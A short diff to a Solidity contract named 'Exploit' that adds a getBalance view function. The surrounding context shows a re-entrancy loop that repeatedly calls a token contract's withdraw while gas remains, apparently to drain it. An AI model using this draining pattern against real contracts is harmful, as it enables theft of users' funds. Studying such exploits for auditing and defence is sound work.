@@ -103,4 +103,8 @@ contract Exploit {
         if (msg.gas > 10000)
             tokenContract.withdraw(value);
     }
+    
+    function getBalance() view returns (uint balance) {
+        balance = address(this).balance;
+    }
 }
